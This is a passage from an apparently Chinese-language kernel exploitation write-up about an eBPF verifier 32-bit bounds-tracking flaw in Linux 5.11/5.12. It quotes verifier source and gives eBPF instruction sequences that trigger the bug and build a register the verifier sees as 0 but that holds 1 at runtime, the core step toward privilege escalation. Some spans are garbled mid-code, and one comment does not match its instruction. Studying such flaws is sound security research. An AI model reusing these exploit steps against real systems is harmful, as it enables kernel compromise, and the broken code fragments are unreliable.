        if (src_known && dst_known) {
                __mark_reg_known(dst_reg, dst_reg->var_off.value);
                return;
        }
      ...
    }
**`[2]`** ：接着
[adjust_scalar_min_max_vals()](https://elixir.bootlin.com/linux/v5.12.3/source/kernel/bpf/verifier.c#L7031)
会调用以下三个函数来更新 `dst_reg` 寄存器的边界。每个函数都包含32位和64位的处理部分，我们这里只关心32位的处理部分。reg
的边界是根据当前边界和 `reg->var_off` 来计算的。
    // __update_reg32_bounds() —— min边界是取 min{当前min边界、reg确定的值}，会变大；max边界是取 max{当前max边界，reg确定的值}，会变小。
    static void __update_reg32_bounds(struct bpf_reg_state *reg)
    {
        struct tnum var32_off = tnum_subreg(reg->var_off);
        /* min signed is max(sign bit) | min(other bits) */
        reg->s32_min_value = max_t(s32, reg->s32_min_value,
                                   var32_off.value | (var32_off.mask & 
                                   S32_MIN));
         /* max signed is min(sign bit) | max(other bits) */
         reg->s32_max_value = min_t(s32, reg->s32_max_value,
                                    var32_off.value | (var32_off.mask & 
                                    S32_MAX));
         reg->u32_min_value = max_t(u32, reg->u32_min_value,
                                   (u32)var32_off.value);
         reg->u32_max_value = min(reg->u32_max_value,
                                 (u32)(var32_off.value |
                                  var32_off.mask));
    }
    // __reg32_deduce_bounds() —— 接着用符号和无符号边界来互相更新
    /* Uses signed min/max values to inform unsigned, and vice-versa */
    static void __reg32_deduce_bounds(struct bpf_reg_state *reg)
    {
        /* Learn sign from signed bounds.
         * If we cannot cross the sign boundary, then signed and
         * unsigned bounds
         * are the same, so combine.  This works even in the
         * negative case, e.g.
         * -3 ss32_min_value >= 0 || reg->s32_max_value s32_min_value = reg->u32_min_value =
                            max_t(u32, reg->s32_min_value, 
                            reg->u32_min_value);
                    reg->s32_max_value = reg->u32_max_value =
                            min_t(u32, reg->s32_max_value, 
                            reg->u32_max_value);
                    return;
        }
    ...
    }
    // __reg_bound_offset() —— 最后，用无符号边界来更新 var_off
    static void __reg_bound_offset(struct bpf_reg_state *reg)
    {
        struct tnum var64_off = tnum_intersect(reg->var_off,    // tnum_intersect() —— 组合两个tnum参数
                                tnum_range(reg->umin_value,        // tnum_range() —— 返回一个tnum，表示给定范围内，所有可能的值。
                                           reg->umax_value));                
        struct tnum var32_off = tnum_intersect(tnum_subreg(reg->var_off),tnum_range(reg->u32_min_value, reg->u32_max_value));
        reg->var_off = tnum_or(tnum_clear_subreg(var64_off), 
                                                 var32_off);
    }
####  1-2 触发漏洞
**BPF代码示例** ：例如指令`BPF_ALU64_REG(BPF_AND, R2, R3)`，对 R2 和 R3 进行与操作，并保存到 R2。
  * `R2->var_off = {mask = 0xFFFFFFFF00000000; value = 0x1}`，表示R2低32位已知为1，高32位未知。由于低32位已知，所以其32位边界也为1。
  * `R3->var_off = {mask = 0x0; value = 0x100000002}`，表示其整个64位都已知，为 `0x100000002`。
更新R2的32位边界的步骤如下：
  * 先调用 [adjust_scalar_min_max_vals()](https://elixir.bootlin.com/linux/v5.12.3/source/kernel/bpf/verifier.c#L7031) -> [tnum_and()](https://elixir.bootlin.com/linux/v5.12.3/source/kernel/bpf/tnum.c#L86) 对 `R2->var_off` 和 `R3->var_off` 进行AND操作，并保存到 `R2->var_off`。 **结果`R2->var_off = {mask = 0x100000000; value = 0x0}`**，由于R3是确定的且R2高32位不确定，所以运算后，只有第32位是不确定的。 
        struct tnum tnum_and(struct tnum a, struct tnum b)
    {
        u64 alpha, beta, v;
        alpha = a.value | a.mask;
        beta = b.value | b.mask;
        v = a.value & b.value;
        return TNUM(v, alpha & beta & ~v);
    }
  * 再调用 [adjust_scalar_min_max_vals()](https://elixir.bootlin.com/linux/v5.12.3/source/kernel/bpf/verifier.c#L7031) -> [scalar32_min_max_and()](https://elixir.bootlin.com/linux/v5.12.3/source/kernel/bpf/verifier.c#L6534)，会直接返回，因为R2和R3的低32位都已知。
  * 再调用 [adjust_scalar_min_max_vals()](https://elixir.bootlin.com/linux/v5.12.3/source/kernel/bpf/verifier.c#L7031) -> [__update_reg_bounds()](https://elixir.bootlin.com/linux/v5.12.3/source/kernel/bpf/verifier.c#L1217) -> [__update_reg32_bounds()](https://elixir.bootlin.com/linux/v5.12.3/source/kernel/bpf/verifier.c#L1189) ，会设置 `u32_max_value = 0`，因为 **`var_off.value = 0code == 0xb7)
        {
            lol = 1;
        }
    select_insn:
            if(lol)
            {
                printk("instruction is: %0x\n", insn->code);
                printk("r0: %llx, r1: %llx, r2: %llx\n", regs[0], 
                regs[1], regs[2]);
                ...
            }
            goto *jumptable[insn->code];
    ...
    }
* * *
## 2\. 漏洞利用 Linux v5.11.7 及以前版本
**特点** ：我们采用`Linux v5.11` 版本的内核进行测试，特点是不需要绕过一种ALU Sanitation，之后我们会详细介绍。
**总目标** ：构造 `r6` 寄存器，使得 `verifier` 认为 `r6` 等于0，但实际执行时等于1。
####  2-1 触发漏洞
首先，我们需要构造出两个寄存器的值状态，分别为`var_off = {mask = 0xFFFFFFFF00000000; value = 0x1}` 和
`var_off = {mask = 0x0; value = 0x100000002}`。然后触发漏洞，得到 `r6` 的 `u32_max_value
= 0 < u32_min_value = 1`。
**注意** ：实际从map传入的 `r5 = r6 = 0`。
    // (1) 构造 r6: var_off = {mask = 0xFFFFFFFF00000000; value = 0x1}
            BPF_MAP_GET(0, BPF_REG_5),                        // (79) r5 = *(u64 *)(r0 +0) 从MAP传入值，这样其 mask=0xffffffffffffffff
            BPF_MOV64_REG(BPF_REG_6, BPF_REG_5),            // (bf) r6 = r5
            BPF_LD_IMM64(BPF_REG_2, 0xFFFFFFFF),            // (18) r2 = 0xffffffff
            BPF_ALU64_IMM(BPF_LSH, BPF_REG_2, 32),            // (67) r2 <<= 32         0xFFFFFFFF00000000
            BPF_ALU64_REG(BPF_AND, BPF_REG_6, BPF_REG_2),    // (5f) r6 &= r2  高32位unknown, 低32位known为0
            BPF_ALU64_IMM(BPF_ADD, BPF_REG_6, 1),            // (07) r6 += 1  {mask = 0xFFFFFFFF00000000, value = 0x1}
    // (2) 构造 r2: var_off = {mask = 0x0; value = 0x100000002}
            BPF_LD_IMM64(BPF_REG_2, 0x1),                    // (18) r2 = 0x1
            BPF_ALU64_IMM(BPF_LSH, BPF_REG_2, 32),            // (67) r2 <<= 32         0x10000 0000
            BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, 2),            // (07) r2 += 2  {mask = 0x0; value = 0x100000002}
    // (3) trigger the vulnerability
            BPF_ALU64_REG(BPF_AND, BPF_REG_6, BPF_REG_8),     // (5f) r6 &= r2         r6: u32_min_value=1, u32_max_value=0
####  2-2 构造 verifier:0 tuntime:1
    // (4) 构造 r5 (r5也是MAP载入的值——0): u32_min_value = 0, u32_max_value = 1, var_off = {mask = 0xFFFFFFFF00000001; value = 0x0}
            BPF_JMP32_IMM(BPF_JLE, BPF_REG_5, 1, 1),        // (b6) if w5 <= 0x1 goto pc+1   r5: u32_min_value = 0, u32_max_value = 1, var_off = {mask = 0xFFFFFFFF00000001; value = 0x0}
            BPF_EXIT_INSN(),
    // (5) 构造 r6:   verifier:0  tuntime:1
            BPF_ALU64_IMM(BPF_ADD, BPF_REG_6, 1),            // (07) r6 += 1         r6: u32_max_value = 1, u32_min_value = 2, var_off = {0x100000000; value = 0x1}
            BPF_ALU64_REG(BPF_ADD, BPF_REG_6, BPF_REG_5),    // (0f) r6 += r5   r6: verify:2   fact:1   !!!!!!!!!!!!!!!!!!!!!!!
            BPF_MOV32_REG(BPF_REG_6, BPF_REG_6),            // (bc) w6 = w6    32位扩展为64位
            BPF_ALU64_IMM(BPF_AND, BPF_REG_6, 1),            // (57) r6 &= 1       r6: verify:0   fact:1